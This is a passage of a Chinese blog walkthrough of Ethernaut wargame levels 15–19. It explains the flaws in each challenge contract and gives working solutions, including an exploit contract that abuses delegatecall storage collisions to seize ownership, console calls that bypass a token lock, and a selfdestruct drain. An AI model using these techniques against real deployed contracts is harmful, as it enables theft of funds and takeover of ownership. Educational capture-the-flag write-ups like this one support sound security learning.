class="code"><pre><code class="hljs solidity">uint256 currentAllowance = allowance(owner, spender);<br>      if (currentAllowance != type(uint256).max) &#123;<br>          require(currentAllowance &gt;= amount, &quot;ERC20: insufficient allowance&quot;);<br>          unchecked &#123;<br>              _approve(owner, spender, currentAllowance - amount);<br>          &#125;<br>      &#125;<br></code></pre></td></tr></table></figure><p>就相当于tranfer直接是拥有者调用，将他的代币转给别人，而transferFrom是由被转账的人调用，这个allowance(owner, spender)就是许可的金额，意思是owner这个账号允许转给spender这个账号的代币的数量，如果这个不空的话，spender就可以调用transferFrom函数从owner那里获得转账。</p></li><li><p>可以直接调用这个 <code>transferFrom</code> ，但是 <code>transferFrom</code> 需要 <code>allowance(owner, spender)</code> 不为空，在 <code>_approve</code> 函数中可以设定 <code>_allowances[owner][spender]</code> 的值，而<code>_approve</code> 函数是被 <code>approve</code> 函数调用了，由于我们就是合约的 <code>owner</code> ，所以可以自己调用 <code>approve</code> 给自己授权</p></li></ul><h3 id="攻击流程-2"><a href="#攻击流程-2" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>查询余额</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220310192324679.png" alt="image-20220310192324679"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-keyword">await</span> contract.allowance(player, <span class="hljs-string">&quot;0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624&quot;</span>)).toString() <span class="hljs-string">&quot;1000000000000000000000000&quot;</span><br><br><span class="hljs-keyword">await</span> contract.approve(<span class="hljs-string">&quot;0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624&quot;</span>, (<span class="hljs-keyword">await</span> contract.balanceOf(player)).toString())<br><br><span class="hljs-keyword">await</span> contract.transferFrom(player, <span class="hljs-string">&#x27;0xcd69Bb01b11200a24F2792Abb643f38625e9FBd1&#x27;</span>, (<span class="hljs-keyword">await</span> contract.balanceOf(player)).toString())<br></code></pre></td></tr></table></figure><p>再次查询余额</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220310192448888.png" alt="image-20220310192448888"></p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220310192147705.png" alt="image-20220310192147705"></p><h2 id="16-Preservation"><a href="#16-Preservation" class="headerlink" title="16. Preservation"></a>16. Preservation</h2><h3 id="闯关要求-3"><a href="#闯关要求-3" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>此合同使用库存储两个不同时区的两个不同时间，构造函数为每次要存储的库创建两个实例。 而玩家的目标是获取合约的owner权限。</p><h3 id="合约代码-3"><a href="#合约代码-3" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Preservation &#123;<br><br>  // public library contracts <br>  address public timeZone1Library;<br>  address public timeZone2Library;<br>  address public owner; <br>  uint storedTime;<br>  // Sets the function signature for delegatecall<br>  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));<br><br>  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;<br>    timeZone1Library = _timeZone1LibraryAddress; <br>    timeZone2Library = _timeZone2LibraryAddress; <br>    owner = msg.sender;<br>  &#125;<br> <br>  // set the time for timezone 1<br>  function setFirstTime(uint _timeStamp) public &#123;<br>    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>  &#125;<br><br>  // set the time for timezone 2<br>  function setSecondTime(uint _timeStamp) public &#123;<br>    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>  &#125;<br>&#125;<br><br>// Simple library contract to set the time<br>contract LibraryContract &#123;<br><br>  // stores a timestamp <br>  uint storedTime;  <br><br>  function setTime(uint _time) public &#123;<br>    storedTime = _time;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="合约分析-3"><a href="#合约分析-3" class="headerlink" title="合约分析"></a>合约分析</h3><ul><li><p><code>delegatecall</code> 与 <code>call</code> 功能类似，区别在于 <code>delegatecall</code> 仅使用给定地址的代码，其它信息则使用当前合约(如存储，余额等等)。注意 <code>delegatecall</code> 是危险函数，它可以完全操作当前合约的状态（实现变量覆盖），可以参考第7题 <code>Delegation</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract a&#123;<br>    uint public x1;<br>    uint public x2;<br><br>    function funca(address param)&#123;<br>        param.delegate(bytes4(keccak256(&quot;funcb()&quot;)));<br>    &#125;<br>&#125;<br>contract b&#123;<br>    uint public y1;<br>    uint public y2;<br><br>    function funcb()&#123;<br>        y1=1;<br>        y2=2;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上述合约中，一旦在 a 中调用了 b 的<code>funcb</code>函数，那么对应 a 中 x1 就会等于，x2 就会等于 2。</p><p>在这个过程中实际 b 合约的<code>funcb</code>函数是把 storage 里面的<code>slot 1</code>的值更换为了 1，把<code>slot 2</code>的值更换为了 2，那么由于 delegatecall 的原因这里修改的是 a 的 storage，对应就是修改了 x1，x2。</p><p>注意，和slot所在的位置有关系，和变量名字没有关系</p></li><li><p><code>delegateCall</code> 方法仅仅使用目标合约的代码， 其余的 <code>storage</code> 等数据均使用自己的，这就使得某些访存操作会错误的处理对象</p></li><li><p>所以这个题可以这样解决：</p><ul><li>我们调用 <code>Preservation</code> 的 <code>setFirstTime</code> 函数实际通过 <code>delegatecall</code> 执行了 <code>LibraryContract</code> 的 <code>setTime</code> 函数，修改了 <code>slot 0</code> ，也就是修改了 <code>timeZone1Library</code> 变量（在 <code>LibraryContract</code> 合约中所修改的 <code>storedTime</code> 位于 <code>slot 0</code> ）</li><li>这样，我们第一次调用 <code>setFirstTime</code> 将 <code>timeZone1Library</code> 变量修改为我们的恶意合约的地址，第二次调用 <code>setFirstTime</code> 就可以执行我们合约的任意代码了</li></ul></li></ul><h3 id="攻击流程-3"><a href="#攻击流程-3" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.0;<br><br>contract Preservation &#123;<br><br>  // public library contracts <br>  address public timeZone1Library;<br>  address public timeZone2Library;<br>  address public owner; <br>  uint storedTime;<br>  // Sets the function signature for delegatecall<br>  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));<br><br>  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;<br>    timeZone1Library = _timeZone1LibraryAddress; <br>    timeZone2Library = _timeZone2LibraryAddress; <br>    owner = msg.sender;<br>  &#125;<br> <br>  // set the time for timezone 1<br>  function setFirstTime(uint _timeStamp) public &#123;<br>    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>  &#125;<br><br>  // set the time for timezone 2<br>  function setSecondTime(uint _timeStamp) public &#123;<br>    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>  &#125;<br>&#125;<br><br>// Simple library contract to set the time<br>contract LibraryContract &#123;<br><br>  // stores a timestamp <br>  uint storedTime;  <br><br>  function setTime(uint _time) public &#123;<br>    storedTime = _time;<br>  &#125;<br>&#125;<br><br>contract exploit &#123;<br>    address public timeZone1Library;<br>    address public timeZone2Library;<br>    address public owner;<br><br>    address instance_add = 0xFCe5b78fC7F350b7a710e644E67A232856E097Fc;<br>    Preservation preservation = Preservation(instance_add);<br><br>    function attack1() public &#123;<br>        preservation.setFirstTime(uint(address(this)));<br>    &#125;<br><br>    function attack2() public &#123;<br>        preservation.setFirstTime(uint(0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624)); //玩家地址<br>    &#125;<br><br>    function setTime(uint _time) public &#123;<br>        timeZone1Library = address(_time);<br>        timeZone2Library = address(_time);<br>        owner = address(_time);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220301222406436.png" alt="image-20220301222406436"></p><h2 id="17-Recovery"><a href="#17-Recovery" class="headerlink" title="17. Recovery"></a>17. Recovery</h2><h3 id="闯关要求-4"><a href="#闯关要求-4" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>合约的创建者已经构建了一个非常简单的合约示例。任何人都可以轻松地创建新的代币。部署第一个令牌合约后，创建者发送了0.5ether以获取更多token。后来他们失去了合同地址。 如果您可以从丢失的合同地址中恢复（或移除）0.5ether，则此级别将完成。</p><h3 id="合约代码-4"><a href="#合约代码-4" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.0;<br><br>import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;<br><br>contract Recovery &#123;<br><br>  //generate tokens<br>  function generateToken(string memory _name, uint256 _initialSupply) public &#123;<br>    new SimpleToken(_name, msg.sender, _initialSupply);<br>  <br>  &#125;<br>&#125;<br><br>contract SimpleToken &#123;<br><br>  using SafeMath for uint256;<br>  // public variables<br>  string public name;<br>  mapping (address =&gt; uint) public balances;<br><br>  // constructor<br>  constructor(string memory _name, address _creator, uint256 _initialSupply) public &#123;<br>    name = _name;<br>    balances[_creator] = _initialSupply;<br>  &#125;<br><br>  // collect ether in return for tokens<br>  receive() external payable &#123;<br>    balances[msg.sender] = msg.value.mul(10);<br>  &#125;<br><br>  // allow transfers of tokens<br>  function transfer(address _to, uint _amount) public &#123; <br>    require(balances[msg.sender] &gt;= _amount);<br>    balances[msg.sender] = balances[msg.sender].sub(_amount);<br>    balances[_to] = _amount;<br>  &#125;<br><br>  // clean up after ourselves<br>  function destroy(address payable _to) public &#123;<br>    selfdestruct(_to);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="合约分析-4"><a href="#合约分析-4" class="headerlink" title="合约分析"></a>合约分析</h3><p>区块链上所有信息都是公开的，将实例地址拿到<a href="https://rinkeby.etherscan.io/">区块链浏览器</a>上去查询即可找回合同地址，再利用 <code>selfdestruct</code> 恢复0.5ether</p><h3 id="攻击流程-4"><a href="#攻击流程-4" class="headerlink" title="攻击流程"></a>攻击流程</h3><p> 实例地址：0x08F66239f112CA4CF479E7a73dEc1d11b6cB92D3</p><p><a href="https://rinkeby.etherscan.io/address/0x08F66239f112CA4CF479E7a73dEc1d11b6cB92D3#internaltx">https://rinkeby.etherscan.io/address/0x08F66239f112CA4CF479E7a73dEc1d11b6cB92D3#internaltx</a></p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220303183155695.png" alt="image-20220303183155695"></p><p>再通过交易信息找到生产合约 <code>lost contract</code> 的地址:0xfB481D6c4B732735Bc0345617e38a8f355DB9985</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220303183414425.png" alt="image-20220303183414425"></p><p>拿到丢失的合约地址以后，去remix部署 <code>SimpleToken</code> ，使用 <code>At address</code> 指定 <code>lost contract</code> 的地址，然后执行 <code>destroy(play_address)</code> 即可</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220303183612735.png" alt="image-20220303183612735"></p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220303183726252.png" alt="image-20220303183726252"></p><p>查看合约地址，发现已经被销毁：<a href="https://rinkeby.etherscan.io/address/0xfb481d6c4b732735bc0345617e38a8f355db9985#internaltx">https://rinkeby.etherscan.io/address/0xfb481d6c4b732735bc0345617e38a8f355db9985#internaltx</a></p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220303185350095.png" alt="image-20220303185350095"></p><p>也可以手动计算地址。</p><p>public a = address（keccak256（0xd6,0x94，YOUR_ADDR，0x01））;</p><p><a href="https://links.jianshu.com/go?to=https://medium.com/coinmonks/ethernaut-lvl-18-recovery-walkthrough-how-to-retrieve-lost-contract-addresses-in-2-ways-aba54ab167d3">参考链接</a></p><h2 id="18-MagicNumber"><a href="#18-MagicNumber" class="headerlink" title="18. MagicNumber"></a>18. MagicNumber</h2><h3 id="闯关要求-5"><a href="#闯关要求-5" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>要解决这个级别，您只需要向etranaut提供一个“Solver”，这是一个响应“whatistMeaningoflife()”的契约，并提供正确的数字。 很容易吧？好。。。有个陷阱。 解算器的代码需要非常小。真的很小。就像怪物真的有点小：最多10个操作码。 提示：也许是时候暂时离开Solidity编译器的舒适性，手工构建这个编译器了。没错：原始EVM字节码。 祝你好运！<br>即要求输出42(操作码为2A)。</p><ul><li>题目的意思就是部署一个合约 <code>Solver</code> ，要求在被调用 <code>whatIsTheMeaningOfLife()</code> 函数时返回 <strong>42</strong> 就可以了，但有一个限制是不能超过 <strong>10</strong> 个 <code>opcode</code></li></ul><h3 id="合约代码-5"><a href="#合约代码-5" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract MagicNum &#123;<br><br>  address public solver;<br><br>  constructor() public &#123;&#125;<br><br>  function setSolver(address _solver) public &#123;<br>    solver = _solver;<br>  &#125;<br><br>  /*<br>    ____________/\\\_______/\\\\\\\\\_____        <br>     __________/\\\\\_____/\\\///////\\\___       <br>      ________/\\\/\\\____\///______\//\\\__      <br>       ______/\\\/\/\\\______________/\\\/___     <br>        ____/\\\/__\/\\\___________/\\\//_____    <br>         __/\\\\\\\\\\\\\\\\_____/\\\//________   <br>          _\///////////\\\//____/\\\/___________  <br>           ___________\/\\\_____/\\\\\\\\\\\\\\\_ <br>            ___________\///_____\///////////////__<br>  */<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="合约分析-5"><a href="#合约分析-5" class="headerlink" title="合约分析"></a>合约分析</h3><p>创建一个简单的合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.11;<br>contract C &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>bytecode</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br><span class="hljs-attr">&quot;linkReferences&quot;</span>: &#123;&#125;,<br><span class="hljs-attr">&quot;object&quot;</span>: <span class="hljs-string">&quot;6080604052348015600f57600080fd5b50603580601d6000396000f3006080604052600080fd00a165627a7a72305820eb3bb9eb1153de451fdb73f63dffc5c28f93dd665ad0b87028137bef976257500029&quot;</span>, <span class="hljs-comment">//字节码</span><br><span class="hljs-attr">&quot;opcodes&quot;</span>: <span class="hljs-string">&quot;PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x35 DUP1 PUSH1 0x1D PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 0xeb EXTCODESIZE 0xb9 0xeb GT MSTORE8 0xde GASLIMIT 0x1f 0xdb PUSH20 0xF63DFFC5C28F93DD665AD0B87028137BEF976257 POP STOP 0x29 &quot;</span>,<br><span class="hljs-attr">&quot;sourceMap&quot;</span>: <span class="hljs-string">&quot;26:15:0:-;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;26:15:0;;;;;;;&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以将上面的字节码分成3个独立的块：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//部署代码</span><br><span class="hljs-number">60606040523415600e57600080</span>fd5b5b603680601c6000396000f300<br><span class="hljs-comment">//合约代码</span><br><span class="hljs-number">60606040525b</span>600080fd00<br><span class="hljs-comment">// Auxdata</span><br>a165627a7a723058209747525da0f525f1132dde30c8276ec70c4786d4b08a798eda3c8314bf796cc30029<br></code></pre></td></tr></table></figure><ul><li>创建合约时运行部署代码</li><li>合约创建成功之后当它的方法被调用时，运行合约代码</li><li>（可选）Auxdata是源码的加密指纹，用来验证。这只是数据，永远不会被EVM执行</li></ul><p>部署代码有两个主要作用：</p><ol><li>运行构造器函数，并设置初始化内存变量（就像合约的拥有者）</li><li>计算合约代码，并返回给EVM</li></ol><p>Solidity编译器产生的部署代码会从字节码中加载<code>60606040525b600080fd00</code>到内存中，然后将它作为合约代码返回。在这个例子中，“计算”只是读取一块数据到内存中。原则上，我们可以编程地产生合约代码。</p><p>常用的汇编指令：</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220305163518304.png" alt="image-20220305163518304"></p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220305163557586.png" alt="image-20220305163557586"></p><figure class="highlight puppet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs puppet">.code<br>  PUSH 80contract <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>  <span class="hljs-keyword">PUSH</span> 40contract <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>  <span class="hljs-keyword">MSTORE</span> <span class="hljs-keyword">contract</span> <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>  <span class="hljs-keyword">CALLVALUE</span> <span class="hljs-keyword">contract</span> <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>  <span class="hljs-keyword">DUP1</span> <span class="hljs-keyword">olidity</span> ^<br>  ISZERO a <br>  PUSH [tag] 1a <br>  JUMPI a <br>  PUSH 0r<br>  DUP1 o<br>  REVERT .11;\r\ncontra<br>tag 1a <br>  JUMPDEST a <br>  POP contract <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>  <span class="hljs-keyword">PUSH</span> #[$] 0000000000000000000000000000000000000000000000000000000000000000contract <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>  <span class="hljs-keyword">DUP1</span> <span class="hljs-keyword">contract</span> <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>  <span class="hljs-keyword">PUSH</span> [$] 0000000000000000000000000000000000000000000000000000000000000000contract <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>  <span class="hljs-keyword">PUSH</span> 0contract <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>  <span class="hljs-keyword">CODECOPY</span> <span class="hljs-keyword">contract</span> <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>  <span class="hljs-keyword">PUSH</span> 0contract <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>  <span class="hljs-keyword">RETURN</span> <span class="hljs-keyword">contract</span> <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>.data<br>  0:<br>    .code<br>      PUSH 80contract <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>      <span class="hljs-keyword">PUSH</span> 40contract <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>      <span class="hljs-keyword">MSTORE</span> <span class="hljs-keyword">contract</span> <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>      <span class="hljs-keyword">PUSH</span> 0contract <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>      <span class="hljs-keyword">DUP1</span> <span class="hljs-keyword">contract</span> <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>      <span class="hljs-keyword">REVERT</span> <span class="hljs-keyword">contract</span> <span class="hljs-keyword">C</span> &#123;\r\n&#125;<br>    .data<br></code></pre></td></tr></table></figure><p>bytecode由两部分构成。</p><p>第一部分的.code包含了一些smart contract初始化的代码，比如构造函数，state variable（全局变量）的赋值等操作。区块链上，这些都是EOA在部署合约时就执行完成的。</p><p>从.data开始，是smart contract的runtime bytecode，也就是在区块链上保存的合约的bytecode。 </p><p>codecopy(t, f, s)-F 从代码的位置 f 开始拷贝 s 个字节到内存的位置 t</p><p><a href="https://blog.csdn.net/Programmer_CJC/article/details/80218649">参考1</a></p><p><a href="https://paper.seebug.org/790/">参考2</a></p><p><a href="https://www.jianshu.com/p/d9137e87c9d3">参考3</a></p><h3 id="攻击流程-5"><a href="#攻击流程-5" class="headerlink" title="攻击流程"></a>攻击流程</h3><p><a href="https://hitcxy.com/2019/ethernaut/">参考</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">bytecode = <span class="hljs-string">&quot;0x600a600c600039600a6000f3602a60805260206080f3&quot;</span>;<br>web3.eth.sendTransaction(&#123;<span class="hljs-attr">from</span>:player,<span class="hljs-attr">data</span>:bytecode&#125;)<br></code></pre></td></tr></table></figure><p>得到合约<a href="https://rinkeby.etherscan.io/tx/0xb354513ca1442426057f5aa0f2404ff4578725d68eccf27a7cdf9535157e7086">https://rinkeby.etherscan.io/tx/0xb354513ca1442426057f5aa0f2404ff4578725d68eccf27a7cdf9535157e7086</a></p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220306145644803.png" alt="image-20220306145644803"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.setSolver(<span class="hljs-string">&#x27;0x1373751D06eC2214c36C314C4e5Ed13b520830Ad&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220306145732582.png" alt="image-20220306145732582"></p><h2 id="19-Alien-Codex"><a href="#19-Alien-Codex" class="headerlink" title="19. Alien Codex"></a>19. Alien Codex</h2><h3 id="闯关要求-6"><a href="#闯关要求-6" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>你打开了一个 Alien 合约. 申明所有权来完成这一关.</p><h3 id="合约代码-6"><a href="#合约代码-6" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.5.0;<br><br>import &#x27;../helpers/Ownable-05.sol&#x27;;<br><br>contract AlienCodex is Ownable &#123;<br><br>  bool public contact;<br>  bytes32[] public codex;<br><br>  modifier contacted() &#123;<br>    assert(contact);<br>    _;<br>  &#125;<br>  <br>  function make_contact() public &#123;<br>    contact = true;<br>  &#125;<br><br>  function record(bytes32 _content) contacted public &#123;<br>  codex.push(_content);<br>  &#125;<br><br>  function retract() contacted public &#123;<br>    codex.length--;<br>  &#125;<br><br>  function revise(uint i, bytes32 _content) contacted public &#123;<br>    codex[i] = _content;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="合约分析-6"><a href="#合约分析-6" class="headerlink" title="合约分析"></a>合约分析</h3><ul><li><p>合约开头 <code>import</code> 了 <a 